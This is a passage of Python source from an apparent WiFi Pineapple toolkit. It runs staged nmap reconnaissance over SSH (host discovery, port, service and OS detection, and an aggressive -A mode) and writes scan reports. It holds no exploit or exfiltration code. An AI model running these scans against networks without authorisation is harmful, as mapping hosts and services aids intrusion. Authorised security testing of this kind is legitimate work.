    remote_cmd = 'nmap ' + ' '.join(shlex.quote(a) for a in nmap_args) + ' ' + shlex.quote(safe_target)

    # SSH transport precheck - cheap, surfaces clear errors instead of an empty
    # subprocess failure later.
    conn = _check_connectivity(cfg)
    if not conn.get('ok'):
        return {
            'ok': False,
            'error': f"Pineapple SSH transport failed: {conn.get('error', 'unreachable')}",
            'failure_type': 'transport_failure',
            'cmd': remote_cmd,
            'scan_origin': 'pineapple',
            'scan_interface': injected_iface,
            'target': safe_target,
        }

    # Verify nmap is installed on the Pineapple.
    probe = _pineapple_nmap_installed(cfg)
    if not probe.get('ok'):
        return {
            'ok': False,
            'error': probe.get('error'),
            'failure_type': probe.get('failure_type'),
            'dependency': probe.get('dependency'),
            'cmd': remote_cmd,
            'scan_origin': 'pineapple',
            'scan_interface': injected_iface,
            'target': safe_target,
        }

    timeout_sec = 600
    result = _run(cfg, f'sh -lc {shlex.quote(remote_cmd)}', timeout=timeout_sec)
    stdout = (result.get('stdout', '') or '').strip()
    stderr = (result.get('stderr', '') or '').strip()
    returncode = result.get('returncode')
    transport_error = result.get('error')
    transport_ftype = result.get('failure_type')
    ok = bool(result.get('ok'))

    error_msg: str | None = None
    failure_type: str | None = None
    if not ok:
        if transport_ftype == 'timeout':
            failure_type = 'timeout'
            error_msg = (
                f'nmap timed out after {timeout_sec}s on the Pineapple. '
                f'For broad subnet scans, prefer pineapple_subnet_map instead of a single aggressive run.'
            )
        elif transport_error and not stderr and not stdout:
            failure_type = transport_ftype or 'transport_failure'
            error_msg = f'Pineapple SSH transport failed: {transport_error}'
        elif stderr:
            failure_type = 'remote_nmap_failure'
            error_msg = f'nmap exited with code {returncode}: {stderr[:1500]}'
        elif stdout:
            failure_type = 'remote_nmap_failure'
            error_msg = f'nmap exited with code {returncode}. Output tail: {stdout[-1500:]}'
        else:
            failure_type = transport_ftype or 'remote_nmap_failure'
            error_msg = (
                f'nmap exited with code {returncode} but produced no output. '
                f'Transport error: {transport_error or "none"}.'
            )

    return {
        'ok': ok,
        'stdout': stdout[-40000:],
        'stderr': stderr[-10000:],
        'returncode': returncode,
        'error': error_msg,
        'failure_type': failure_type,
        'timeout_sec': timeout_sec,
        'cmd': remote_cmd,
        'scan_origin': 'pineapple',
        'scan_interface': injected_iface,
        'target': safe_target,
    }


_SUBNET_MAP_ALLOWED_STAGES = ('discover', 'ports', 'services', 'os')


def _safe_stage_label(stage_name: str) -> str:
    """Sanitize a stage name like ``services:192.168.X.X`` for use in a filename."""
    return re.sub(r'[^A-Za-z0-9_.\-]+', '_', stage_name or 'stage').strip('_') or 'stage'


def _subnet_map_artifact_paths(timestamp: str) -> dict[str, Path]:
    """Create and return the artifact directory layout for a subnet-map run."""
    rdir = reports_dir() / f'nmap_subnet_map_{timestamp}'
    cdir = captures_dir() / f'nmap_subnet_map_{timestamp}'
    ldir = logs_dir()
    rdir.mkdir(parents=True, exist_ok=True)
    cdir.mkdir(parents=True, exist_ok=True)
    ldir.mkdir(parents=True, exist_ok=True)
    return {
        'report_dir': rdir,
        'capture_dir': cdir,
        'log_path': ldir / f'nmap_subnet_map_{timestamp}.log',
        'summary_json_path': rdir / 'summary.json',
        'commands_path': rdir / 'commands.txt',
        'report_markdown_path': rdir / 'report.md',
        'report_html_path': rdir / 'report.html',
    }


def _append_log(log_path: Path, line: str) -> None:
    try:
        with log_path.open('a', encoding='utf-8') as fp:
            fp.write(f'[{datetime.utcnow().isoformat(timespec="seconds")}Z] {line}\n')
    except OSError:
        pass


def _write_stage_artifacts(
    capture_dir: Path,
    artifacts_index: dict[str, str],
    stage_label: str,
    stage: dict[str, Any],
) -> dict[str, str | None]:
    """Persist raw stdout, cleaned XML, and stderr for one Nmap stage.

    Returns a dict of the paths written (absolute strings) and also updates
    ``artifacts_index`` with ``{label}_raw`` / ``{label}_xml`` / ``{label}_stderr``
    keys for inclusion in the top-level ``artifacts`` return.
    """
    label = _safe_stage_label(stage_label)
    raw_text = stage.get('stdout') or ''
    stderr_text = stage.get('stderr') or ''
    raw_path = capture_dir / f'{label}.raw.txt'
    xml_path = capture_dir / f'{label}.xml'
    stderr_path = capture_dir / f'{label}.stderr.txt'
    written: dict[str, str | None] = {'raw': None, 'xml': None, 'stderr': None}
    try:
        raw_path.write_text(raw_text, encoding='utf-8')
        written['raw'] = str(raw_path)
        artifacts_index[f'{label}_raw'] = str(raw_path)
    except OSError:
        pass
    xml_doc = _extract_nmap_xml_document(raw_text)
    if xml_doc:
        try:
            xml_path.write_text(xml_doc, encoding='utf-8')
            written['xml'] = str(xml_path)
            artifacts_index[f'{label}_xml'] = str(xml_path)
        except OSError:
            pass
    if stderr_text.strip():
        try:
            stderr_path.write_text(stderr_text, encoding='utf-8')
            written['stderr'] = str(stderr_path)
            artifacts_index[f'{label}_stderr'] = str(stderr_path)
        except OSError:
            pass
    return written


def _write_commands_file(commands_path: Path, commands_run: list[str]) -> None:
    try:
        commands_path.write_text('\n'.join(commands_run) + '\n', encoding='utf-8')
    except OSError:
        pass


def _write_summary_json(summary_json_path: Path, summary: dict[str, Any]) -> None:
    try:
        summary_json_path.write_text(
            json.dumps(summary, indent=2, default=str, sort_keys=False),
            encoding='utf-8',
        )
    except OSError:
        pass


def _render_subnet_map_markdown(summary: dict[str, Any]) -> str:
    """Build report.md content from a subnet-map summary dict."""
    lines: list[str] = []
    target = summary.get('target') or '?'
    iface = summary.get('scan_interface') or '?'
    origin = summary.get('scan_origin') or 'pineapple'
    live_hosts = summary.get('live_hosts') or []
    port_scan_results = summary.get('port_scan_results') or []
    service_results = summary.get('service_results') or []
    os_results = summary.get('os_results') or []
    warnings = summary.get('warnings') or []
    failed_stages = summary.get('failed_stages') or []
    commands_run = summary.get('commands_run') or []
    artifacts = summary.get('artifacts') or {}

    open_port_count = sum(len(pr.get('ports') or []) for pr in port_scan_results)
    service_count = sum(len(sr.get('services') or []) for sr in service_results)
    os_guess_count = sum(1 for osr in os_results if (osr.get('best') or {}).get('name'))

    lines.append(f'# Nmap Subnet Map - {target}')
    lines.append('')
    lines.append('## 1. Executive Summary')
    lines.append('')
    lines.append(f'- Target: `{target}`')
    lines.append(f'- Scan origin: `{origin}`')
    lines.append(f'- Interface: `{iface}`')
    lines.append(f'- Live hosts: **{len(live_hosts)}**')
    lines.append(f'- Open ports: **{open_port_count}**')
    lines.append(f'- Services identified: **{service_count}**')
    lines.append(f'- OS guesses: **{os_guess_count}**')
    lines.append(f'- Failed stages: **{len(failed_stages)}**')
    lines.append('')

    lines.append('## 2. Connected Network')
    lines.append('')
    lines.append(f'- Pineapple IP: `{summary.get("connected_ip") or "?"}`')
    lines.append(f'- Gateway: `{summary.get("connected_gateway") or "?"}`')
    lines.append(f'- Subnet: `{summary.get("connected_subnet") or "?"}`')
    lines.append(f'- Interface: `{iface}`')
    lines.append('')

    lines.append('## 3. Live Hosts')
    lines.append('')
    if live_hosts:
        lines.append('| IP | MAC | Vendor | Hostname | Reason |')
        lines.append('|----|-----|--------|----------|--------|')
        for h in live_hosts:
            lines.append(
                f'| {h.get("ip") or ""} '
                f'| {h.get("mac") or ""} '
                f'| {h.get("vendor") or ""} '
                f'| {h.get("hostname") or ""} '
                f'| {h.get("reason") or ""} |'
            )
    else:
        lines.append('_No live hosts._')
    lines.append('')

    lines.append('## 4. Open Ports')
    lines.append('')
    if port_scan_results:
        lines.append('| Host | Port/Proto | State | Service | Reason |')
        lines.append('|------|------------|-------|---------|--------|')
        for pr in port_scan_results:
            host = pr.get('host') or '?'
            for p in pr.get('ports') or []:
                svc_name = (p.get('service') or {}).get('name') or ''
                lines.append(
                    f'| {host} '
                    f'| {p.get("port")}/{p.get("protocol") or ""} '
                    f'| {p.get("state") or ""} '
                    f'| {svc_name} '
                    f'| {p.get("reason") or ""} |'
                )
    else:
        lines.append('_No open ports observed._')
    lines.append('')

    lines.append('## 5. Services')
    lines.append('')
    if service_results:
        lines.append('| Host | Port/Proto | Product | Version | Extra info |')
        lines.append('|------|------------|---------|---------|------------|')
        for sr in service_results:
            host = sr.get('host') or '?'
            for svc in sr.get('services') or []:
                lines.append(
                    f'| {host} '
                    f'| {svc.get("port")}/{svc.get("protocol") or ""} '
                    f'| {svc.get("product") or svc.get("name") or ""} '
                    f'| {svc.get("version") or ""} '
                    f'| {svc.get("extrainfo") or ""} |'
                )
    else:
        lines.append('_No services identified._')
    lines.append('')

    lines.append('## 6. OS Guesses')
    lines.append('')
    if os_results:
        lines.append('| Host | Best guess | Accuracy | Class | Note |')
        lines.append('|------|------------|----------|-------|------|')
        for osr in os_results:
            host = osr.get('host') or '?'
            best = osr.get('best') or {}
            best_name = best.get('name') if best else ''
            acc = best.get('accuracy') if best else ''
            classes = osr.get('classes') or []
            cls_bits: list[str] = []
            if classes:
                c0 = classes[0]
                parts = [c0.get('type'), c0.get('vendor'), c0.get('osfamily'), c0.get('osgen')]
                cls_bits = [p for p in parts if p]
            cls_str = ' / '.join(cls_bits)
            note = osr.get('note') or ''
            lines.append(
                f'| {host} | {best_name or ""} | {acc if acc != "" else ""} | {cls_str} | {note} |'
            )
    else:
        lines.append('_No OS detection performed or no reliable guesses._')
    lines.append('')

    lines.append('## 7. Commands Run')
    lines.append('')
    if commands_run:
        lines.append('```')
        for c in commands_run:
            lines.append(c)
        lines.append('```')
    else:
        lines.append('_No commands recorded._')
    lines.append('')

    lines.append('## 8. Warnings / Failed Stages')
    lines.append('')
    if failed_stages:
        lines.append('**Failed stages:**')
        for s in failed_stages:
            lines.append(f'- {s}')
        lines.append('')
    if warnings:
        lines.append('**Warnings:**')
        for w in warnings:
            lines.append(f'- {w}')
        lines.append('')
    if not failed_stages and not warnings:
        lines.append('_None._')
        lines.append('')

    lines.append('## 9. Artifact Index')
    lines.append('')
    lines.append(f'- Report directory: `{summary.get("report_dir") or ""}`')
    lines.append(f'- Capture directory: `{summary.get("capture_dir") or ""}`')
    lines.append(f'- Log: `{summary.get("log_path") or ""}`')
    lines.append(f'- Summary JSON: `{summary.get("summary_json_path") or ""}`')
    lines.append(f'- Commands: `{summary.get("commands_path") or ""}`')
    if artifacts:
        lines.append('')
        lines.append('Stage artifacts:')
        for k in sorted(artifacts.keys()):
            lines.append(f'- `{k}`: `{artifacts[k]}`')
    lines.append('')
    return '\n'.join(lines)


def _render_subnet_map_html(summary: dict[str, Any]) -> str:
    """Build a simple browsable HTML report from the summary dict."""
    e = _html.escape
    target = summary.get('target') or '?'
    iface = summary.get('scan_interface') or '?'
    origin = summary.get('scan_origin') or 'pineapple'
    live_hosts = summary.get('live_hosts') or []
    port_scan_results = summary.get('port_scan_results') or []
    service_results = summary.get('service_results') or []
    os_results = summary.get('os_results') or []
    warnings = summary.get('warnings') or []
    failed_stages = summary.get('failed_stages') or []
    commands_run = summary.get('commands_run') or []
    artifacts = summary.get('artifacts') or {}

    def _table(headers: list[str], rows: list[list[str]]) -> str:
        if not rows:
            return '<p><em>None.</em></p>'
        h = ''.join(f'<th>{e(x)}</th>' for x in headers)
        body = ''.join(
            '<tr>' + ''.join(f'<td>{e(str(c))}</td>' for c in r) + '</tr>'
            for r in rows
        )
        return f'<table><thead><tr>{h}</tr></thead><tbody>{body}</tbody></table>'

    hosts_rows = [
        [h.get('ip') or '', h.get('mac') or '', h.get('vendor') or '',
         h.get('hostname') or '', h.get('reason') or '']
        for h in live_hosts
    ]
    port_rows: list[list[str]] = []
    for pr in port_scan_results:
        host = pr.get('host') or ''
        for p in pr.get('ports') or []:
            svc_name = (p.get('service') or {}).get('name') or ''
            port_rows.append([
                host, f'{p.get("port")}/{p.get("protocol") or ""}',
                p.get('state') or '', svc_name, p.get('reason') or '',
            ])
    svc_rows: list[list[str]] = []
    for sr in service_results:
        host = sr.get('host') or ''
        for svc in sr.get('services') or []:
            svc_rows.append([
                host, f'{svc.get("port")}/{svc.get("protocol") or ""}',
                svc.get('product') or svc.get('name') or '',
                svc.get('version') or '', svc.get('extrainfo') or '',
            ])
    os_rows: list[list[str]] = []
    for osr in os_results:
        host = osr.get('host') or ''
        best = osr.get('best') or {}
        classes = osr.get('classes') or []
        cls_bits: list[str] = []
        if classes:
            c0 = classes[0]
            cls_bits = [x for x in (
                c0.get('type'), c0.get('vendor'), c0.get('osfamily'), c0.get('osgen'),
            ) if x]
        os_rows.append([
            host, (best.get('name') if best else '') or '',
            str(best.get('accuracy')) if best and best.get('accuracy') is not None else '',
            ' / '.join(cls_bits), osr.get('note') or '',
        ])

    open_port_count = sum(len(pr.get('ports') or []) for pr in port_scan_results)
    service_count = sum(len(sr.get('services') or []) for sr in service_results)
    os_guess_count = sum(1 for osr in os_results if (osr.get('best') or {}).get('name'))

    warning_html = (
        '<ul>' + ''.join(f'<li>{e(w)}</li>' for w in warnings) + '</ul>'
        if warnings else '<p><em>None.</em></p>'
    )
    failed_html = (
        '<ul>' + ''.join(f'<li>{e(s)}</li>' for s in failed_stages) + '</ul>'
        if failed_stages else ''
    )
    cmds_html = (
        '<pre>' + e('\n'.join(commands_run)) + '</pre>'
        if commands_run else '<p><em>None.</em></p>'
    )
    art_html_parts: list[str] = []
    for k in sorted(artifacts.keys()):
        art_html_parts.append(f'<li><code>{e(k)}</code>: <code>{e(artifacts[k])}</code></li>')
    art_html = f'<ul>{"".join(art_html_parts)}</ul>' if art_html_parts else '<p><em>None.</em></p>'

    style = (
        'body{font-family:system-ui,sans-serif;margin:2rem;max-width:1100px;}'
        'table{border-collapse:collapse;width:100%;margin:0.5rem 0;}'
        'th,td{border:1px solid #ccc;padding:4px 8px;text-align:left;font-size:0.9rem;}'
        'th{background:#f2f2f2;}h1{margin-bottom:0.2rem;}h2{margin-top:1.5rem;}'
        'code{background:#f5f5f5;padding:1px 4px;border-radius:3px;}'
        'pre{background:#f5f5f5;padding:0.6rem;border-radius:4px;overflow:auto;}'
    )
    parts: list[str] = []
    parts.append('<!DOCTYPE html><html><head><meta charset="utf-8">')
    parts.append(f'<title>Nmap Subnet Map - {e(target)}</title>')
    parts.append(f'<style>{style}</style></head><body>')
    parts.append(f'<h1>Nmap Subnet Map - {e(target)}</h1>')
    parts.append(f'<p>Origin: <code>{e(origin)}</code> · Interface: <code>{e(iface)}</code></p>')
    parts.append('<h2>1. Executive Summary</h2><ul>')
    parts.append(f'<li>Target: <code>{e(target)}</code></li>')
    parts.append(f'<li>Live hosts: <b>{len(live_hosts)}</b></li>')
    parts.append(f'<li>Open ports: <b>{open_port_count}</b></li>')
    parts.append(f'<li>Services: <b>{service_count}</b></li>')
    parts.append(f'<li>OS guesses: <b>{os_guess_count}</b></li>')
    parts.append(f'<li>Failed stages: <b>{len(failed_stages)}</b></li></ul>')
    parts.append('<h2>2. Connected Network</h2><ul>')
    parts.append(f'<li>Pineapple IP: <code>{e(summary.get("connected_ip") or "?")}</code></li>')
    parts.append(f'<li>Gateway: <code>{e(summary.get("connected_gateway") or "?")}</code></li>')
    parts.append(f'<li>Subnet: <code>{e(summary.get("connected_subnet") or "?")}</code></li>')
    parts.append(f'<li>Interface: <code>{e(iface)}</code></li></ul>')
    parts.append('<h2>3. Live Hosts</h2>')
    parts.append(_table(['IP', 'MAC', 'Vendor', 'Hostname', 'Reason'], hosts_rows))
    parts.append('<h2>4. Open Ports</h2>')
    parts.append(_table(['Host', 'Port/Proto', 'State', 'Service', 'Reason'], port_rows))
    parts.append('<h2>5. Services</h2>')
    parts.append(_table(['Host', 'Port/Proto', 'Product', 'Version', 'Extra info'], svc_rows))
    parts.append('<h2>6. OS Guesses</h2>')
    parts.append(_table(['Host', 'Best guess', 'Accuracy', 'Class', 'Note'], os_rows))
    parts.append('<h2>7. Commands Run</h2>')
    parts.append(cmds_html)
    parts.append('<h2>8. Warnings / Failed Stages</h2>')
    if failed_html:
        parts.append('<h3>Failed stages</h3>' + failed_html)
    parts.append('<h3>Warnings</h3>' + warning_html)
    parts.append('<h2>9. Artifact Index</h2><ul>')
    parts.append(f'<li>Report dir: <code>{e(str(summary.get("report_dir") or ""))}</code></li>')
    parts.append(f'<li>Capture dir: <code>{e(str(summary.get("capture_dir") or ""))}</code></li>')
    parts.append(f'<li>Log: <code>{e(str(summary.get("log_path") or ""))}</code></li>')
    parts.append(f'<li>Summary JSON: <code>{e(str(summary.get("summary_json_path") or ""))}</code></li>')
    parts.append(f'<li>Commands: <code>{e(str(summary.get("commands_path") or ""))}</code></li>')
    parts.append('</ul>' + art_html)
    parts.append('</body></html>')
    return ''.join(parts)


def _persist_subnet_map_reports(summary: dict[str, Any]) -> None:
    """Write commands.txt, summary.json, report.md, report.html for a run."""
    report_dir = summary.get('report_dir')
    if not report_dir:
        return
    rdir = Path(report_dir)
    _write_commands_file(rdir / 'commands.txt', summary.get('commands_run') or [])
    _write_summary_json(rdir / 'summary.json', summary)
    md = _render_subnet_map_markdown(summary)
    html = _render_subnet_map_html(summary)
    try:
        (rdir / 'report.md').write_text(md, encoding='utf-8')
    except OSError:
        pass
    try:
        (rdir / 'report.html').write_text(html, encoding='utf-8')
    except OSError:
        pass


def pineapple_subnet_map(
    target: str,
    cfg: dict[str, Any],
    interface: str = 'wlan2',
    stages: list[str] | None = None,
    aggressive: bool = False,
) -> dict[str, Any]:
    """Staged subnet mapping from the Pineapple's upstream interface.

    Flow:
      preflight → discover (-sn) → fast port scan (-F) on live hosts →
      service detection (-sV --version-light) on hosts with open ports →
      OS detection (-O --osscan-guess) on hosts with open ports.

    When ``aggressive=True``, skip the staged service/OS split and run
    ``-A`` per live host instead (still after discovery - never blind).
    """
    # ── Validation ──
    requested_stages: list[str] = []
    for s in (stages or list(_SUBNET_MAP_ALLOWED_STAGES)):
        if s in _SUBNET_MAP_ALLOWED_STAGES and s not in requested_stages:
            requested_stages.append(s)
    if not requested_stages:
        requested_stages = list(_SUBNET_MAP_ALLOWED_STAGES)

    iface = _validate_interface(interface)
    if not iface:
        return {
            'ok': False,
            'stage': 'preflight',
            'failure_type': 'invalid_interface',
            'error': f'Invalid interface name: {interface!r}',
            'scan_origin': 'pineapple',
            'target': target,
            'failed_stages': ['preflight'],
            'commands_run': [],
        }
    safe_target = _validate_scan_target(target)
    if not safe_target:
        return {
            'ok': False,
            'stage': 'preflight',
            'failure_type': 'invalid_target',
            'error': f'Invalid target: {target!r}. Expected IPv4, CIDR, or range.',
            'scan_origin': 'pineapple',
            'scan_interface': iface,
            'target': target,
            'failed_stages': ['preflight'],
            'commands_run': [],
        }

    # ── Artifact directory layout ──
    run_ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    paths = _subnet_map_artifact_paths(run_ts)
    report_dir = paths['report_dir']
    capture_dir = paths['capture_dir']
    log_path = paths['log_path']
    summary_json_path = paths['summary_json_path']
    commands_path = paths['commands_path']
    report_markdown_path = paths['report_markdown_path']
    report_html_path = paths['report_html_path']
    artifacts_index: dict[str, str] = {}
    _append_log(log_path, f'subnet_map start target={safe_target} interface={iface} '
                          f'stages={requested_stages} aggressive={aggressive}')

    warnings: list[str] = []
    failed_stages: list[str] = []
    commands_run: list[str] = []
    stage_results: dict[str, Any] = {}
    raw_excerpts: dict[str, str] = {}

    def _artifact_paths_block() -> dict[str, Any]:
        return {
            'report_dir': str(report_dir),
            'capture_dir': str(capture_dir),
            'log_path': str(log_path),
            'summary_json_path': str(summary_json_path),
            'commands_path': str(commands_path),
            'report_markdown_path': str(report_markdown_path),
            'report_html_path': str(report_html_path),
            'artifacts': dict(artifacts_index),
        }

    def _finalize(result: dict[str, Any]) -> dict[str, Any]:
        """Merge artifact paths into result and persist summary/reports/log."""
        result.update(_artifact_paths_block())
        try:
            _persist_subnet_map_reports(result)
        except Exception as exc:  # pragma: no cover - best-effort writes
            _append_log(log_path, f'persist_reports_failed: {type(exc).__name__}: {exc}')
        _append_log(log_path, f'subnet_map end ok={result.get("ok")} '
                              f'live_hosts={len(result.get("live_hosts") or [])} '
                              f'failed_stages={result.get("failed_stages") or []}')
        return result

    # ── Preflight ──
    preflight: dict[str, Any] = {'checks': []}

    conn = _check_connectivity(cfg)
    preflight['checks'].append({
        'check': 'ssh_connectivity', 'ok': bool(conn.get('ok')),
        'detail': conn.get('error'),
    })
    if not conn.get('ok'):
        return _finalize({
            'ok': False,
            'stage': 'preflight',
            'failure_type': 'transport_failure',
            'error': f"Pineapple SSH transport failed: {conn.get('error', 'unreachable')}",
            'preflight': preflight,
            'scan_origin': 'pineapple',
            'scan_interface': iface,
            'target': safe_target,
            'live_hosts': [],
            'port_scan_results': [],
            'service_results': [],
            'os_results': [],
            'warnings': warnings,
            'failed_stages': ['preflight'],
            'commands_run': commands_run,
        })

    nmap_probe = _pineapple_nmap_installed(cfg)
    preflight['checks'].append({
        'check': 'nmap_installed', 'ok': bool(nmap_probe.get('ok')),
        'detail': nmap_probe.get('error'),
    })
    if not nmap_probe.get('ok'):
        return _finalize({
            'ok': False,
            'stage': 'preflight',
            'failure_type': nmap_probe.get('failure_type', 'dependency_missing'),
            'error': nmap_probe.get('error'),
            'dependency': nmap_probe.get('dependency'),
            'preflight': preflight,
            'scan_origin': 'pineapple',
            'scan_interface': iface,
            'target': safe_target,
            'live_hosts': [],
            'port_scan_results': [],
            'service_results': [],
            'os_results': [],
            'warnings': warnings,
            'failed_stages': ['preflight'],
            'commands_run': commands_run,
        })

    iface_info = _pineapple_interface_info(cfg, iface)
    preflight['checks'].append({
        'check': 'interface_ipv4', 'ok': bool(iface_info.get('ok')),
        'detail': iface_info.get('error'),
        'ipv4': iface_info.get('ipv4'), 'cidr': iface_info.get('cidr'),
    })
    if not iface_info.get('ok'):
        return _finalize({
            'ok': False,
            'stage': 'preflight',
            'failure_type': iface_info.get('failure_type', 'interface_no_ipv4'),
            'error': iface_info.get('error'),
            'preflight': preflight,
            'scan_origin': 'pineapple',
            'scan_interface': iface,
            'target': safe_target,
            'live_hosts': [],
            'port_scan_results': [],
            'service_results': [],
            'os_results': [],
            'warnings': warnings,
            'failed_stages': ['preflight'],
            'commands_run': commands_run,
        })
    connected_ip = iface_info.get('ipv4')
    connected_cidr = iface_info.get('cidr')
    connected_subnet: str | None = None
    if connected_cidr:
        try:
            import ipaddress as _ipaddr
            connected_subnet = str(_ipaddr.ip_interface(connected_cidr).network)
        except (ValueError, TypeError):
            connected_subnet = None

    route_check = _pineapple_route_to_target(cfg, safe_target, iface)
    preflight['checks'].append({
        'check': 'route_to_target', 'ok': bool(route_check.get('ok')),
        'detail': route_check.get('error'),
    })
    if not route_check.get('ok'):
        return _finalize({
            'ok': False,
            'stage': 'preflight',
            'failure_type': route_check.get('failure_type', 'no_route'),
            'error': route_check.get('error'),
            'preflight': preflight,
            'scan_origin': 'pineapple',
            'scan_interface': iface,
            'target': safe_target,
            'connected_ip': connected_ip,
            'connected_subnet': connected_subnet,
            'live_hosts': [],
            'port_scan_results': [],
            'service_results': [],
            'os_results': [],
            'warnings': warnings,
            'failed_stages': ['preflight'],
            'commands_run': commands_run,
        })

    # Best-effort gateway ping - purely informational.
    connected_gateway = _pineapple_gateway_for_iface(cfg, iface)
    if connected_gateway:
        ping_r = _run(
            cfg,
            f'ping -c 1 -W 2 {shlex.quote(connected_gateway)} >/dev/null 2>&1 && echo OK || echo FAIL',
            timeout=10,
        )
        gw_ok = 'OK' in (ping_r.get('stdout', '') or '')
        preflight['checks'].append({
            'check': 'gateway_ping', 'ok': gw_ok, 'gateway': connected_gateway,
        })
        if not gw_ok:
            warnings.append(
                f'Gateway {connected_gateway} did not respond to ping from the Pineapple '
                f'(may indicate ICMP blocking or an AP isolation rule; scans can still proceed).'
            )

    # ── Runtime helpers (closures capture cfg/iface) ──
    def _q(t: str) -> str:
        return shlex.quote(t)

    def _host_list_str(hosts: list[str]) -> str:
        return ' '.join(_q(h) for h in hosts)

    live_hosts: list[dict[str, Any]] = []
    host_ips: list[str] = []
    port_scan_results: list[dict[str, Any]] = []
    service_results: list[dict[str, Any]] = []
    os_results: list[dict[str, Any]] = []

    # ── Stage 1: discover ──
    if 'discover' in requested_stages:
        discover_cmd = f'nmap -sn -e {_q(iface)} --reason -oX - {_q(safe_target)}'
        stage = _run_remote_nmap_stage(cfg, 'discover', discover_cmd, timeout=180)
        commands_run.append(stage['cmd'])
        combined = (stage.get('stdout', '') + '\n' + stage.get('stderr', '')).lower()
        if not stage['ok'] and any(k in combined for k in (
            'invalid argument', 'unrecognized', 'no such', 'failed to open device',
            'no device found', 'could not determine'
        )) and '-e' in stage['cmd']:
            warnings.append(
                f'Interface forcing with -e {iface} failed on this Nmap build; '
                f'retrying without -e because the route table confirms the target is reachable via {iface}.'
            )
            _write_stage_artifacts(capture_dir, artifacts_index, 'discover_attempt1', stage)
            discover_cmd2 = f'nmap -sn --reason -oX - {_q(safe_target)}'
            stage = _run_remote_nmap_stage(cfg, 'discover', discover_cmd2, timeout=180)
            commands_run.append(stage['cmd'])
        stage_results['discover'] = stage
        raw_excerpts['discover'] = (stage.get('stdout', '') or '')[-4000:]
        _write_stage_artifacts(capture_dir, artifacts_index, 'discover', stage)

        parsed_discover: dict[str, Any] = {}
        if stage.get('stdout'):
            parsed_discover = _parse_nmap_xml(stage['stdout'])
            live_hosts = list(parsed_discover.get('live_hosts') or [])
            if parsed_discover.get('parser_warning'):
                warnings.append(str(parsed_discover['parser_warning']))
            if parsed_discover.get('parse_error') and '<nmaprun' in stage['stdout']:
                warnings.append(
                    f'discover XML parse error: {parsed_discover["parse_error"]}'
                )
            if not live_hosts:
                text_hosts = _parse_nmap_live_hosts_text(stage['stdout'])
                if text_hosts:
                    live_hosts = text_hosts
                    warnings.append(
                        'Falling back to text-mode parser for discover stdout - '
                        'XML parsing did not yield hosts.'
                    )

        runstats = parsed_discover.get('runstats') or {}
        if (runstats.get('up', 0) > 0) and not live_hosts:
            warnings.append(
                f'parser_failed: runstats reports {runstats["up"]} host(s) up '
                f'but no hosts were extracted. See {capture_dir}/discover.raw.txt.'
            )

        if not stage['ok']:
            failed_stages.append('discover')
            return _finalize({
                'ok': False,
                'stage': 'discover',
                'failure_type': stage.get('failure_type') or 'discovery_failed',
                'error': _best_stage_error(stage, 'Host discovery (nmap -sn) failed'),
                'scan_origin': 'pineapple',
                'scan_interface': iface,
                'target': safe_target,
                'connected_ip': connected_ip,
                'connected_gateway': connected_gateway,
                'connected_subnet': connected_subnet,
                'preflight': preflight,
                'live_hosts': live_hosts,
                'port_scan_results': [],
                'service_results': [],
                'os_results': [],
                'warnings': warnings,
                'failed_stages': failed_stages,
                'commands_run': commands_run,
                'stages': stage_results,
                'raw_output_excerpts': raw_excerpts,
            })

        host_ips = [h['ip'] for h in live_hosts if h.get('ip')]
        if not host_ips:
            return _finalize({
                'ok': True,
                'note': 'No live hosts discovered on the target network.',
                'scan_origin': 'pineapple',
                'scan_interface': iface,
                'target': safe_target,
                'connected_ip': connected_ip,
                'connected_gateway': connected_gateway,
                'connected_subnet': connected_subnet,
                'preflight': preflight,
                'live_hosts': [],
                'port_scan_results': [],
                'service_results': [],
                'os_results': [],
                'warnings': warnings,
                'failed_stages': failed_stages,
                'commands_run': commands_run,
                'stages': stage_results,
                'raw_output_excerpts': raw_excerpts,
                'aggressive': aggressive,
                'stages_run': requested_stages,
            })

    # ── Aggressive per-host path ──
    if aggressive and host_ips:
        agg_stage_results: list[dict[str, Any]] = []
        for host in host_ips[:64]:  # hard cap
            agg_cmd = f'nmap -T4 -A --reason --open -e {_q(iface)} -oX - {_q(host)}'
            stage = _run_remote_nmap_stage(cfg, f'aggressive:{host}', agg_cmd, timeout=600)
            commands_run.append(stage['cmd'])
            agg_stage_results.append(stage)
            raw_excerpts[f'aggressive:{host}'] = (stage.get('stdout', '') or '')[-4000:]
            _write_stage_artifacts(capture_dir, artifacts_index, f'aggressive_{host}', stage)
            if not stage['ok']:
                failed_stages.append(f'aggressive:{host}')
                warnings.append(_best_stage_error(stage, f'Aggressive scan failed on {host}'))
                continue
            parsed = _parse_nmap_xml(stage.get('stdout', ''))
            if parsed.get('parser_warning'):
                warnings.append(str(parsed['parser_warning']))
            for p_ip, ports in parsed.get('ports_by_host', {}).items():
                open_ports = [p for p in ports if p.get('state') == 'open']
                if open_ports:
                    port_scan_results.append({'host': p_ip, 'ports': open_ports})
            for p_ip, svcs in parsed.get('services_by_host', {}).items():
                service_results.append({'host': p_ip, 'services': svcs})
            for p_ip, osinfo in parsed.get('os_by_host', {}).items():
                os_results.append({'host': p_ip, **osinfo})
        stage_results['aggressive'] = agg_stage_results
    else:
        hosts_with_open_ports: list[str] = []

        # ── Stage 2: fast open-port scan ──
        if 'ports' in requested_stages and host_ips:
            ports_cmd = f'nmap -T4 -F --open --reason -e {_q(iface)} -oX - {_host_list_str(host_ips)}'
            stage = _run_remote_nmap_stage(cfg, 'ports', ports_cmd, timeout=600)
            commands_run.append(stage['cmd'])
            stage_results['ports'] = stage
            raw_excerpts['ports'] = (stage.get('stdout', '') or '')[-6000:]
            _write_stage_artifacts(capture_dir, artifacts_index, 'ports', stage)
            if not stage['ok']:
                failed_stages.append('ports')
                warnings.append(_best_stage_error(stage, 'Fast port scan failed'))
            else:
                parsed = _parse_nmap_xml(stage.get('stdout', ''))
                if parsed.get('parser_warning'):
                    warnings.append(str(parsed['parser_warning']))
                for p_ip, ports in parsed.get('ports_by_host', {}).items():
                    open_ports = [p for p in ports if p.get('state') == 'open']
                    if open_ports:
                        hosts_with_open_ports.append(p_ip)
                        port_scan_results.append({'host': p_ip, 'ports': open_ports})

        # ── Stage 3: service/version scan per host ──
        if 'services' in requested_stages and hosts_with_open_ports:
            svc_stage_results: list[dict[str, Any]] = []
            for host in hosts_with_open_ports:
                host_ports = next(
                    (pr['ports'] for pr in port_scan_results if pr['host'] == host),
                    [],
                )
                port_nums = ','.join(str(p['port']) for p in host_ports if p.get('port'))
                if not port_nums:
                    continue
